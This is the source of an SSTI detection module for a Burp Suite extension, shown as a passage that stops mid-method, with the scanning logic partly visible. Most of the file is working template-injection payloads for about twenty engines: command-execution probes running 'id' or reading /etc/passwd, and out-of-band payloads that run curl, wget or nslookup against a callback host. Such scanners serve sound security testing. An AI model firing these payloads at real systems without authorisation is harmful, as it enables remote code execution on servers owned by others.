package com.omnistrike.modules.injection;
import com.omnistrike.framework.stepper.StepperHttp;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.collaborator.InteractionType;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.framework.JsonScanSupport;
import com.omnistrike.framework.PayloadEncoder;
import com.omnistrike.framework.ResponseGuard;
import com.omnistrike.framework.ScanTargetIdentity;

import com.omnistrike.model.*;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Pattern;

/**
 * MODULE 6: Comprehensive SSTI Scanner
 * Detects Server-Side Template Injection across multiple template engines.
 * Uses polyglot probes, engine-specific payloads, and reflection context detection.
 */
public class SstiScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;
    // Parameters confirmed exploitable via OOB — skip all remaining phases for these
    private final Set<String> oobConfirmedTargets = ConcurrentHashMap.newKeySet();

    private final ConcurrentHashMap<String, Boolean> tested = new ConcurrentHashMap<>();

    // Polyglot probe payloads and their expected results
    // Use large unique numbers (e.g., 133*991=131803) to avoid matching natural page content.
    // "49" from 7*7 matches page numbers, dates, etc. "131803" is extremely unlikely in normal HTML.
    private static final String SSTI_EXPECTED = "131803";
    private static final String[][] POLYGLOT_PROBES = {
            // payload, expectedResult, description
            {"{{133*991}}", SSTI_EXPECTED, "Jinja2/Twig/Angular"},
            {"${133*991}", SSTI_EXPECTED, "Freemarker/Mako/EL"},
            {"<%= 133*991 %>", SSTI_EXPECTED, "ERB (Ruby)"},
            {"#{133*991}", SSTI_EXPECTED, "Pug/Jade/Thymeleaf"},
            {"{133*991}", SSTI_EXPECTED, "Smarty/Velocity"},
            {"#set($x=133*991)${x}", SSTI_EXPECTED, "Velocity"},
            {"[[${133*991}]]", SSTI_EXPECTED, "Thymeleaf inline"},
            {"{{= 133*991}}", SSTI_EXPECTED, "doT.js"},
            {"<#assign x=133*991>${x}", SSTI_EXPECTED, "Freemarker assign"},
            {"${T(java.lang.Math).multiplyExact(137,997)}", "136589", "Spring Expression Language"},
            {"{if 133*991==131803}131803{/if}", SSTI_EXPECTED, "Smarty (if conditional)"},
            {"@(133*991)", SSTI_EXPECTED, "Razor (.NET)"},
            {"{% debug %}", "settings|TEMPLATES|INSTALLED_APPS", "Django debug tag"},
            {"<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}", "uid=", "Freemarker assign RCE"},
            {"${{133*991}}", SSTI_EXPECTED, "Combined Jinja2/Freemarker"},
            {"{{constructor.constructor('return 133*991')()}}", SSTI_EXPECTED, "Prototype pollution eval"},
            {"{{range.constructor('return 133*991')()}}", SSTI_EXPECTED, "Nunjucks/Handlebars range constructor"},
            {"{php}echo 133*991;{/php}", SSTI_EXPECTED, "Smarty PHP block (legacy)"},
            {"{%set x=133*991%}{{x}}", SSTI_EXPECTED, "Jinja2 set tag"},
            {"${131000+803}", SSTI_EXPECTED, "Spring EL addition"},
            {"<%= 133.*(991) %>", SSTI_EXPECTED, "ERB method call"},
            {"p #{133*991}", SSTI_EXPECTED, "Slim template (Ruby)"},
            {"{{ 133 | times: 991 }}", SSTI_EXPECTED, "Liquid template eval"},
            {"@(133 * 991)", SSTI_EXPECTED, "Razor (with spaces)"},
    };

    // Universal polyglot that triggers errors in most engines
    private static final String POLYGLOT_ERROR = "${{<%[%'\"}}%\\.";

    // Engine identification payloads (safe mode - math only)
    private static final Map<String, String[][]> ENGINE_PROBES = new LinkedHashMap<>();

    static {
        // Engine identification probes. Expected tokens MUST be unique strings that an
        // un-evaluated template / a sanitizer-stripped payload / natural page content
        // cannot produce. Short or common tokens (e.g. "function", "Process", "20",
        // "[", "test") are forbidden — they FP on any page that happens to contain them.
        // Probes that cannot meet this bar were dropped rather than tightened.
        ENGINE_PROBES.put("Jinja2", new String[][]{
                {"{{config}}", "<Config '", "Flask config access"}, // Flask Config repr: "<Config '...'>"
                {"{{self.__class__}}", "<class 'jinja2.runtime.TemplateReference'>|<class 'jinja2.environment.TemplateModule'>", "Jinja2 class"},
                {"{{request.environ}}", "wsgi.url_scheme|wsgi.multithread|wsgi.multiprocess", "Flask request object"},
                {"{{[].__class__.__base__.__subclasses__()}}", "<class 'subprocess.Popen'>|<class 'warnings.catch_warnings'>", "Python MRO"},
                {"{{lipsum.__globals__}}", "<module 'os' from|<built-in module", "Jinja2 lipsum globals"},
                {"{{cycler.__init__.__globals__.os.popen('id').read()}}", "uid=", "Jinja2 RCE via cycler (AGGRESSIVE)"},
                {"{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fbase\\x5f\\x5f')|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()}}", "<class 'subprocess.Popen'>|<class 'warnings.catch_warnings'>", "Jinja2 attr+hex filter bypass"},
                {"{{().__class__.__mro__[1].__subclasses__()}}", "<class 'subprocess.Popen'>|<class 'warnings.catch_warnings'>", "Jinja2 MRO via hex escape"},
        });
        ENGINE_PROBES.put("Twig", new String[][]{
                {"{{_self.env.getFilter('id')}}", "object(Twig\\TwigFilter)|Twig\\TwigFilter#", "Twig self reference"},
                {"{{'omnistrike_ssti_confirm'|upper}}", "OMNISTRIKE_SSTI_CONFIRM", "Twig filter"},
                {"{{'133'*7}}", "133133133133133133133", "Twig string repeat"},
                {"{{_self.env.getRuntimeLoader()}}", "Twig\\RuntimeLoader\\FactoryRuntimeLoader|Twig\\RuntimeLoader\\ContainerRuntimeLoader", "Twig runtime loader"},
                {"{{dump(app)}}", "Symfony\\Bundle\\FrameworkBundle\\Templating\\Helper\\AppVariable|object(Symfony\\Bridge\\Twig\\AppVariable)", "Symfony app dump"},
                {"{{['id']|filter('system')}}", "uid=", "Twig RCE (AGGRESSIVE)"},
                {"{{['id']|filter('passthru')}}", "uid=", "Twig passthru filter (AGGRESSIVE)"},
                // Dropped: reduce filter probe — "omnistrike" too easily appears via reflection
        });
        ENGINE_PROBES.put("Spring Expression Language", new String[][]{
                {"${T(java.lang.Math).multiplyExact(137,997)}", "136589", "Spring EL type access"},
        });
        ENGINE_PROBES.put("Freemarker", new String[][]{
                // Dropped: ${.version} → "2." matches any decimal anywhere on the page
                {"${\"freemarker.template.utility.ObjectConstructor\"?new()}", "freemarker.template.utility.ObjectConstructor@", "Freemarker OC"}, // toString() includes @hash
                {"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "uid=", "Freemarker RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Velocity", new String[][]{
                {"#set($x=133*991)$x", SSTI_EXPECTED, "Velocity set"},
                {"$class.inspect('java.lang.Runtime')", "class java.lang.Runtime", "Velocity reflection"}, // .inspect() returns "class java.lang.Runtime"
                {"#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())$rt.exec('id')", "java.lang.UNIXProcess@|java.lang.ProcessImpl@|Process[pid=", "Velocity RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Thymeleaf", new String[][]{
                {"__${133*991}__", SSTI_EXPECTED, "Thymeleaf preprocessor"},
                {"__${T(java.lang.Runtime).getRuntime().exec('id')}__", "java.lang.UNIXProcess@|java.lang.ProcessImpl@|Process[pid=", "Thymeleaf RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Mako", new String[][]{
                {"${self.module.__builtins__}", "<module 'builtins'|{'__name__': 'builtins'", "Mako builtins access"}, // repr of builtins module
                {"<%import os%>${os.popen('id').read()}", "uid=", "Mako RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("ERB", new String[][]{
                // Dropped: Dir.entries('/') → "[" — useless single-character match
                {"<%= system('id') %>", "uid=", "ERB RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Pug", new String[][]{
                {"#{root.process.mainModule.require('child_process').execSync('id')}", "uid=", "Pug RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Handlebars", new String[][]{
                // constructor lookup serializes "function Object() { [native code] }" — match the distinctive marker
                {"{{#each (lookup this \"constructor\")}}{{this}}{{/each}}", "{ [native code] }", "Handlebars constructor lookup"},
                {"{{#if true}}omnistrike_hbs_confirmed{{/if}}", "omnistrike_hbs_confirmed", "Handlebars if helper"},
                {"{{#with (lookup this \"constructor\")}}{{#with (lookup this \"constructor\")}}{{this (\"return this.process.mainModule.require('child_process').execSync('id')\")}}{{/with}}{{/with}}", "uid=", "Handlebars RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Smarty", new String[][]{
                {"{math equation=\"133*991\"}", SSTI_EXPECTED, "Smarty math"},
                // Dropped: {$smarty.version} → "3.|4.|5." matches any version-like decimal
                {"{if 133*991==131803}131803{/if}", SSTI_EXPECTED, "Smarty if conditional"},
                {"{php}echo 133*991;{/php}", SSTI_EXPECTED, "Smarty PHP tags (deprecated in v3+)"},
                {"{if phpinfo()}{/if}", "PHP Version", "Smarty phpinfo (AGGRESSIVE)"},
                {"{system('id')}", "uid=", "Smarty RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("doT.js", new String[][]{
                {"{{= 133*991}}", SSTI_EXPECTED, "doT.js eval"},
                {"{{= global.process.mainModule.require('child_process').execSync('id') }}", "uid=", "doT.js RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Nunjucks", new String[][]{
                {"{{range.constructor(\"return 133*991\")()}}", SSTI_EXPECTED, "Nunjucks constructor eval"},
                {"{{range.constructor(\"return this.process.mainModule.require('child_process').execSync('id')\")()}}", "uid=", "Nunjucks RCE (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Django", new String[][]{
                {"{% debug %}", "INSTALLED_APPS|MIDDLEWARE_CLASSES|DATABASES", "Django debug tag"}, // Django settings keys, not generic words
                {"{% load log %}{% get_admin_log 10 as log %}{{log}}", "<QuerySet [<LogEntry:|<LogEntry:", "Django admin log"},
                // Dropped: {% include 'admin/base.html' %} → "Django|admin|doctype" — "admin"/"doctype" ubiquitous
        });
        ENGINE_PROBES.put("Razor", new String[][]{
                {"@(133*991)", SSTI_EXPECTED, "Razor eval"},
                // Dropped: @DateTime.Now → "20" matches almost every page
                // Dropped: @System.IO.Directory.GetCurrentDirectory() → "/|C:\\" matches almost every page
                {"@System.Diagnostics.Process.Start(\"id\")", "System.Diagnostics.Process (id)", "Razor RCE (AGGRESSIVE)"}, // Process.ToString() format
        });
        ENGINE_PROBES.put("EJS", new String[][]{
                {"<%= process.mainModule.require('child_process').execSync('id') %>", "uid=", "EJS RCE (AGGRESSIVE)"},
        });
        // Mustache: dropped entirely — only probe was {{#list}}test{{/list}} → "test|list",
        // both of which appear in nearly every page. No reliable safe probe exists for Mustache.
        ENGINE_PROBES.put("Liquid", new String[][]{
                {"{{ 133 | times: 991 }}", SSTI_EXPECTED, "Liquid filter"},
                {"{{ 'omnistrike' | upcase }}", "OMNISTRIKE", "Liquid upcase filter"},
                {"{% assign x = 133 %}{{ x | times: 991 }}", SSTI_EXPECTED, "Liquid assign + filter"},
        });
        ENGINE_PROBES.put("Blade", new String[][]{
                {"{!! 133*991 !!}", SSTI_EXPECTED, "Blade unescaped output"},
                {"@php echo 133*991; @endphp", SSTI_EXPECTED, "Blade PHP block (AGGRESSIVE)"},
        });
        ENGINE_PROBES.put("Groovy", new String[][]{
                {"<% println 133*991 %>", SSTI_EXPECTED, "Groovy template"},
                {"${\"cat /etc/passwd\".execute().text}", "root:x:0:0:", "Groovy RCE (AGGRESSIVE)"}, // tightened: require full passwd marker, not bare "root:"
        });
    }

    // Error patterns that indicate template engine presence
    private static final Map<String, Pattern> ENGINE_ERROR_PATTERNS = Map.ofEntries(
            // Tightened: require jinja2 namespace or full class name to avoid FP on generic Python "UndefinedError"
            Map.entry("Jinja2", Pattern.compile("jinja2\\.exceptions|jinja2.*?UndefinedError|jinja2.*?TemplateSyntaxError", Pattern.CASE_INSENSITIVE)),
            Map.entry("Twig", Pattern.compile("Twig_Error|Twig\\\\Error|twig\\.error", Pattern.CASE_INSENSITIVE)),
            Map.entry("Freemarker", Pattern.compile("freemarker\\.core|FreeMarker|ParseException.*freemarker", Pattern.CASE_INSENSITIVE)),
            Map.entry("Velocity", Pattern.compile("org\\.apache\\.velocity|VelocityException", Pattern.CASE_INSENSITIVE)),
            Map.entry("Thymeleaf", Pattern.compile("org\\.thymeleaf|ThymeleafView|TemplateProcessingException", Pattern.CASE_INSENSITIVE)),
            Map.entry("Mako", Pattern.compile("mako\\.exceptions|MakoException", Pattern.CASE_INSENSITIVE)),
            Map.entry("ERB", Pattern.compile("ActionView::Template::Error|ERB::Util", Pattern.CASE_INSENSITIVE)),
            Map.entry("Smarty", Pattern.compile("Smarty[_ ]error|SmartyException|Smarty_Internal", Pattern.CASE_INSENSITIVE)),
            Map.entry("Pug", Pattern.compile("PugException|pug_error|pug.*unexpected token|unexpected token.*pug", Pattern.CASE_INSENSITIVE)),
            Map.entry("Django", Pattern.compile("TemplateSyntaxError|django\\.template", Pattern.CASE_INSENSITIVE)),
            Map.entry("Razor", Pattern.compile("RazorEngine|System\\.Web\\.Mvc|CompilationError", Pattern.CASE_INSENSITIVE)),
            Map.entry("Handlebars", Pattern.compile("Handlebars\\.Exception|handlebars.*error|handlebars.*Missing helper|handlebars.*Parse error", Pattern.CASE_INSENSITIVE)),
            Map.entry("EJS", Pattern.compile("ejs.*error|EJS.*compile|ReferenceError.*ejs", Pattern.CASE_INSENSITIVE)),
            Map.entry("Nunjucks", Pattern.compile("nunjucks.*error|Template render error.*nunjucks", Pattern.CASE_INSENSITIVE)),
            Map.entry("doT.js", Pattern.compile("doT\\.template|doT.*error", Pattern.CASE_INSENSITIVE)),
            Map.entry("Mustache", Pattern.compile("Mustache.*error|Mustache.*Missing.*tag|Mustache.*Unclosed.*section", Pattern.CASE_INSENSITIVE)),
            Map.entry("Liquid", Pattern.compile("Liquid.*error|Liquid::SyntaxError|Liquid.*Unknown tag", Pattern.CASE_INSENSITIVE)),
            Map.entry("Blade", Pattern.compile("Blade.*error|(?:Blade|Laravel).*View.*not found|(?:Blade|Laravel).*Undefined variable", Pattern.CASE_INSENSITIVE)),
            Map.entry("Groovy", Pattern.compile("groovy\\.lang|GroovyRuntimeException|MissingMethodException", Pattern.CASE_INSENSITIVE))
    );

    // OOB SSTI payloads for Collaborator-based blind detection
    // Each template engine has DNS (nslookup) AND HTTP (curl/wget) variants.
    // DNS variants work with Burp Collaborator; HTTP variants work with Custom OOB listener.
    private static final String[][] OOB_SSTI_PAYLOADS = {
        // Jinja2 / Python — DNS
        {"{{config.__class__.__init__.__globals__['os'].popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (nslookup)"},
        {"{{''.__class__.__mro__[1].__subclasses__()[287]('nslookup COLLAB_PLACEHOLDER',shell=True,stdout=-1).communicate()}}", "Jinja2 OOB (subprocess)"},
        {"${__import__('os').popen('nslookup COLLAB_PLACEHOLDER').read()}", "Mako OOB (nslookup)"},
        // Jinja2 / Python — HTTP (Custom OOB compatible)
        {"{{config.__class__.__init__.__globals__['os'].popen('curl http://COLLAB_PLACEHOLDER/ssti').read()}}", "Jinja2 OOB (curl)"},
        {"{{config.__class__.__init__.__globals__['os'].popen('wget -q -O /dev/null http://COLLAB_PLACEHOLDER/ssti').read()}}", "Jinja2 OOB (wget)"},
        {"${__import__('os').popen('curl http://COLLAB_PLACEHOLDER/ssti').read()}", "Mako OOB (curl)"},
        {"{{config.__class__.__init__.__globals__['__builtins__']['__import__']('urllib.request').urlopen('http://COLLAB_PLACEHOLDER/ssti')}}", "Jinja2 OOB (urllib)"},
        // Twig / PHP — DNS
        {"{{['nslookup COLLAB_PLACEHOLDER']|filter('system')}}", "Twig OOB (system)"},
        {"{system('nslookup COLLAB_PLACEHOLDER')}", "Smarty OOB (system)"},
        // Twig / PHP — HTTP (Custom OOB compatible)
        {"{{['curl http://COLLAB_PLACEHOLDER/ssti']|filter('system')}}", "Twig OOB (curl)"},
        {"{system('curl http://COLLAB_PLACEHOLDER/ssti')}", "Smarty OOB (curl)"},
        {"{file_get_contents('http://COLLAB_PLACEHOLDER/ssti')}", "Smarty OOB (file_get_contents)"},
        // Freemarker / Java — DNS
        {"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"nslookup COLLAB_PLACEHOLDER\")}", "Freemarker OOB (Execute)"},
        {"${T(java.lang.Runtime).getRuntime().exec('nslookup COLLAB_PLACEHOLDER')}", "Spring EL OOB"},
        {"__${T(java.lang.Runtime).getRuntime().exec('nslookup COLLAB_PLACEHOLDER')}__", "Thymeleaf OOB"},
        // Freemarker / Java — HTTP (Custom OOB compatible)
        {"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"curl http://COLLAB_PLACEHOLDER/ssti\")}", "Freemarker OOB (curl)"},
        {"${T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl http://COLLAB_PLACEHOLDER/ssti\"})}", "Spring EL OOB (curl)"},
        {"__${T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl http://COLLAB_PLACEHOLDER/ssti\"})}__", "Thymeleaf OOB (curl)"},
        {"${T(java.net.URL).new('http://COLLAB_PLACEHOLDER/ssti').openStream()}", "Spring EL OOB (URL)"},
        // ERB / Ruby — DNS
        {"<%= `nslookup COLLAB_PLACEHOLDER` %>", "ERB OOB (backtick)"},
        {"<%= system('nslookup COLLAB_PLACEHOLDER') %>", "ERB OOB (system)"},
        // ERB / Ruby — HTTP (Custom OOB compatible)
        {"<%= `curl http://COLLAB_PLACEHOLDER/ssti` %>", "ERB OOB (curl backtick)"},
        {"<%= system('curl http://COLLAB_PLACEHOLDER/ssti') %>", "ERB OOB (curl system)"},
        {"<%= require('net/http').get_response(URI('http://COLLAB_PLACEHOLDER/ssti')) %>", "ERB OOB (net/http)"},
        // Pug / Node.js — DNS
        {"#{root.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')}", "Pug OOB"},
        // Pug / Node.js — HTTP (Custom OOB compatible)
        {"#{root.process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti')}", "Pug OOB (curl)"},
        // Velocity / Java — DNS
        {"#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())$rt.exec('nslookup COLLAB_PLACEHOLDER')", "Velocity OOB"},
        // Velocity / Java — HTTP (Custom OOB compatible)
        {"#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())$rt.exec(new String[]{\"/bin/sh\",\"-c\",\"curl http://COLLAB_PLACEHOLDER/ssti\"})", "Velocity OOB (curl)"},
        // Smarty / PHP — DNS
        {"{if system('nslookup COLLAB_PLACEHOLDER')}{/if}", "Smarty OOB (if system)"},
        // Smarty / PHP — HTTP (Custom OOB compatible)
        {"{if system('curl http://COLLAB_PLACEHOLDER/ssti')}{/if}", "Smarty OOB (if curl)"},
        // Nunjucks / Node.js — DNS
        {"{{range.constructor(\"return this.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')\")()}}", "Nunjucks OOB"},
        // Nunjucks / Node.js — HTTP (Custom OOB compatible)
        {"{{range.constructor(\"return this.process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti')\")()}}", "Nunjucks OOB (curl)"},
        // Razor / .NET — DNS
        {"@System.Diagnostics.Process.Start(\"nslookup\",\"COLLAB_PLACEHOLDER\")", "Razor OOB"},
        // Razor / .NET — HTTP (Custom OOB compatible)
        {"@System.Diagnostics.Process.Start(\"curl\",\"http://COLLAB_PLACEHOLDER/ssti\")", "Razor OOB (curl)"},
        {"@System.Diagnostics.Process.Start(\"powershell\",\"Invoke-WebRequest http://COLLAB_PLACEHOLDER/ssti\")", "Razor OOB (powershell)"},
        // doT.js / Node.js — DNS
        {"{{= global.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER') }}", "doT.js OOB"},
        // doT.js / Node.js — HTTP (Custom OOB compatible)
        {"{{= global.process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti') }}", "doT.js OOB (curl)"},
        // Handlebars / Node.js — DNS
        {"{{#with (lookup this \"constructor\")}}{{#with (lookup this \"constructor\")}}{{this (\"return this.process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')\")}}{{/with}}{{/with}}", "Handlebars OOB (constructor)"},
        // Handlebars / Node.js — HTTP (Custom OOB compatible)
        {"{{#with (lookup this \"constructor\")}}{{#with (lookup this \"constructor\")}}{{this (\"return this.process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti')\")}}{{/with}}{{/with}}", "Handlebars OOB (curl)"},
        // EJS / Node.js — DNS
        {"<%= process.mainModule.require('child_process').execSync('nslookup COLLAB_PLACEHOLDER') %>", "EJS OOB (execSync)"},
        {"<%= require('child_process').execSync('nslookup COLLAB_PLACEHOLDER') %>", "EJS OOB (require)"},
        // EJS / Node.js — HTTP (Custom OOB compatible)
        {"<%= process.mainModule.require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti') %>", "EJS OOB (curl execSync)"},
        {"<%= require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti') %>", "EJS OOB (curl require)"},
        // Django / Python (limited — Django templates are sandboxed, but custom template tags or debug mode may allow execution)
        // Additional Jinja2 OOB variants — DNS
        {"{{lipsum.__globals__['os'].popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (lipsum globals)"},
        {"{{cycler.__init__.__globals__.os.popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (cycler)"},
        {"{{joiner.__init__.__globals__.os.popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (joiner)"},
        {"{{namespace.__init__.__globals__.os.popen('nslookup COLLAB_PLACEHOLDER').read()}}", "Jinja2 OOB (namespace)"},
        // Additional Jinja2 OOB variants — HTTP (Custom OOB compatible)
        {"{{lipsum.__globals__['os'].popen('curl http://COLLAB_PLACEHOLDER/ssti').read()}}", "Jinja2 OOB (lipsum curl)"},
        {"{{cycler.__init__.__globals__.os.popen('curl http://COLLAB_PLACEHOLDER/ssti').read()}}", "Jinja2 OOB (cycler curl)"},
        // Additional Smarty OOB variants
        // Additional Twig OOB variants — DNS
        {"{{['nslookup COLLAB_PLACEHOLDER']|filter('exec')}}", "Twig OOB (exec filter)"},
        // Additional Twig OOB variants — HTTP (Custom OOB compatible)
        {"{{['curl http://COLLAB_PLACEHOLDER/ssti']|filter('exec')}}", "Twig OOB (curl exec)"},
        // Additional ERB OOB variants
        // Groovy OOB — DNS
        {"${\"nslookup COLLAB_PLACEHOLDER\".execute()}", "Groovy OOB (execute)"},
        // Groovy OOB — HTTP (Custom OOB compatible)
        {"${\"curl http://COLLAB_PLACEHOLDER/ssti\".execute()}", "Groovy OOB (curl)"},
        {"${new URL('http://COLLAB_PLACEHOLDER/ssti').text}", "Groovy OOB (URL)"},
        // Additional EJS OOB variants — DNS
        {"<%= require('child_process').execSync('nslookup COLLAB_PLACEHOLDER').toString() %>", "EJS OOB (toString)"},
        // Additional EJS OOB variants — HTTP (Custom OOB compatible)
        {"<%= require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti').toString() %>", "EJS OOB (curl toString)"},
        // Pug OOB variants — DNS
        {"#{require('child_process').execSync('nslookup COLLAB_PLACEHOLDER').toString()}", "Pug OOB (toString)"},
        // Pug OOB variants — HTTP (Custom OOB compatible)
        {"#{require('child_process').execSync('curl http://COLLAB_PLACEHOLDER/ssti').toString()}", "Pug OOB (curl toString)"},
    };

    @Override
    public String getId() { return "ssti-scanner"; }

    @Override
    public String getName() { return "SSTI Scanner"; }

    @Override
    public String getDescription() {
        return "Comprehensive Server-Side Template Injection detection across 12+ template engines.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore, CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlowForParameter(
            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<InjectionTarget> targets = extractTargets(request);
        targets.removeIf(t -> !t.matchesParameterName(targetParameterName));
        return runSstiTargets(requestResponse, targets, urlPath);
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<InjectionTarget> targets = extractTargets(request);
        return runSstiTargets(requestResponse, targets, urlPath);
    }

    private List<Finding> runSstiTargets(HttpRequestResponse requestResponse,
                                          List<InjectionTarget> targets, String urlPath) {
        for (InjectionTarget target : targets) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return Collections.emptyList();
            if (!dedup.markIfNewRaw("ssti-scanner:"
                    + scanTargetKey(requestResponse.request(), target))) continue;

            try {
                testSsti(requestResponse, target);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return Collections.emptyList();
            } catch (Exception e) {
                api.logging().logToError("SSTI test error on " + target.name + ": " + e.getMessage());
            }
        }

        return Collections.emptyList();
    }

    private void testSsti(HttpRequestResponse original, InjectionTarget target) throws InterruptedException {
        String url = original.request().url();
        boolean aggressiveMode = config.getBool("ssti.aggressive", false);
        boolean oobEnabled = aggressiveMode && config.getBool("ssti.oob.enabled", true)
                && collaboratorManager != null && collaboratorManager.isAvailable();

        // Get baseline response
        HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
        if (baseline == null || baseline.response() == null) return;
        String baselineBody = baseline.response().bodyToString();
        if (baselineBody == null) baselineBody = "";

        // Step 2: Error-triggering polyglot
        HttpRequestResponse errorResult = sendPayload(original, target, POLYGLOT_ERROR);
        if (errorResult != null && errorResult.response() != null) {
            String errorBody = errorResult.response().bodyToString();
            if (errorBody == null) errorBody = "";
            int errorStatus = errorResult.response().statusCode();

            // Check for template engine error messages
            for (Map.Entry<String, Pattern> entry : ENGINE_ERROR_PATTERNS.entrySet()) {
                if (entry.getValue().matcher(errorBody).find() && !entry.getValue().matcher(baselineBody).find()) {
                    findingsStore.addFinding(Finding.builder("ssti-scanner",
                                    "SSTI Indicator: " + entry.getKey() + " error triggered",
                                    Severity.LOW, Confidence.TENTATIVE)
                            .url(url).parameter(target.name)
                            .evidence("Engine: " + entry.getKey() + " | Polyglot triggered error response (status " + errorStatus + ")")
                            .description("Template engine error detected. Input may reach a " + entry.getKey() + " template.")
                            .requestResponse(errorResult)
                            .payload(POLYGLOT_ERROR)
                            .build());
                }
            }
        }

        // Step 3: Math evaluation probes
        if (isOobConfirmed(original, target)) return;
        boolean templateConfirmed = false;

        for (String[] probe : POLYGLOT_PROBES) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
            ProbeInstance instance = instantiatePolyglot(probe);
            String payload = instance.payload();
            String expected = instance.expected();
            String engineHint = instance.engineHint();

            if (!aggressiveMode && isAggressivePolyglot(payload)) continue;


            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            // Skip error responses — template evaluation should produce a 200, not a 4xx/5xx
            int responseStatus = result.response().statusCode();
            if (responseStatus >= 400) continue;

            String responseBody = result.response().bodyToString();
            if (responseBody == null) responseBody = "";

            // Check if expected result appears in response but NOT in baseline
            // Support OR matching: "A|B|C" means any of A, B, C must be found
            // Guard: if baseline is empty, skip math-result checks (e.g., "49") to avoid FPs
            String matchedToken = matchExpected(responseBody, baselineBody, payload, expected);
            if (matchedToken != null) {
                // Verify template syntax was consumed — if the raw payload appears verbatim
                // in the response, the server is just reflecting input, not evaluating it.
                // The expected value may coincidentally exist elsewhere on the page.
                boolean syntaxConsumed = !responseBody.contains(payload);
                if (!syntaxConsumed || payload.contains(matchedToken)) continue;

                // Additional check: the expected value must not be a substring of the payload
                // (e.g., if payload is "{{131803}}" and expected is "131803", the server might
                // just be stripping the braces). Verify result appears in a different context.
                // Skip if expected appears ONLY adjacent to remnants of the payload syntax.

                HttpRequestResponse confirmation = sendPayload(original, target, payload);
                if (confirmation == null || confirmation.response() == null
                        || confirmation.response().statusCode() >= 400) continue;
                String confirmationBody = confirmation.response().bodyToString();
                if (!matchedToken.equals(matchExpected(
                        confirmationBody, baselineBody, payload, expected))) continue;

                templateConfirmed = true;

                findingsStore.addFinding(Finding.builder("ssti-scanner",
                                "SSTI Detected: " + engineHint + " template evaluation",
                                Severity.HIGH, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + payload + " | Expected: " + expected
                                + " found in response (template syntax consumed)")
                        .description("Template expression was evaluated — the template syntax was consumed "
                                + "and replaced with the computed result. Engine hint: " + engineHint)
                        .requestResponse(confirmation)
                        .payload(payload)
                        .responseEvidence(matchedToken)
                        .build());
                break;
            }

            perHostDelay();
        }

        // Step 4: Engine identification (if template evaluation confirmed)
        if (isOobConfirmed(original, target)) return;
        String identifiedEngine = null;
        if (templateConfirmed) {
